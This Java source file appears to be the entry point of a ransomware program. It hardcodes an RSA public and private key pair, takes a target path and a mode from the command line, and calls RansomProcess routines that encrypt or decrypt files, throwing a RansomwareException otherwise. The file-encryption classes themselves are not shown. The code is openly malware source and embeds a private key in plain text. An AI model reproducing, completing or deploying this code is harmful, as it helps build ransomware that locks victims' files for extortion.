package com.security;


public class App {
    private static final String PubicKey = "MFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBAJCw1HHQooCFGsGhtxNrsdS6dDq5jtfHqqLInCj7qFlDaD/Sll5+BAUjV0GU/c+6PVyMKzmLrHh49eeGQy1ETN8CAwEAAQ==";
    private static final String PrivateKey = "MIIBVAIBADANBgkqhkiG9w0BAQEFAASCAT4wggE6AgEAAkEAkLDUcdCigIUawaG3E2ux1Lp0OrmO18eqosicKPuoWUNoP9KWXn4EBSNXQZT9z7o9XIwrOYuseHj154ZDLURM3wIDAQABAkA9AnLx8tkye+2GTBwYEkcPvfcYc/mpPsXSkehW15Zq3IALx3Kr5GgKGOaB2FK6PU0QzEPQbNJXdA5ZPjwTDcQBAiEA1/zINRVlrLpw2HPfqsYQ8ZSDuG2rVUUKKmKgJQXeQ98CIQCrfsw2+VKOaFoJm5BpVxIT5nsE8CXn4fr/WSFuklMXAQIgTKWnAreCKmbLTvTn5bl+H8zdZaB9kbf7YIk5XYoUky8CIQCL2ccnPYK5ZxelphrKDJtNZzMC/+OpiXtqKIE+7kycAQIgRK/DUhWUgSQV5u7VoCHDyLPCntjFMGBsg7Wi1uq+EDM=";

    private static final String ENCRYPT = "ENCRYPT";
    private static final String DECRYPT = "DECRYPT";

    public static void main(String[] args) throws RansomwareException {

        Processing(args[0], args[1]);
    }

    private static void Processing(final String toSearch, final String attack) throws RansomwareException {
        final RansomProcess p = new RansomProcess(toSearch);

        if (attack.equalsIgnoreCase(ENCRYPT))
            p.StartEncryptProcess(PubicKey);
        else if (attack.equalsIgnoreCase(DECRYPT))
            p.StartDecryptProcess(PrivateKey);
        else
            throw new RansomwareException("Mismatched Values Try again with correct one");

    }

}
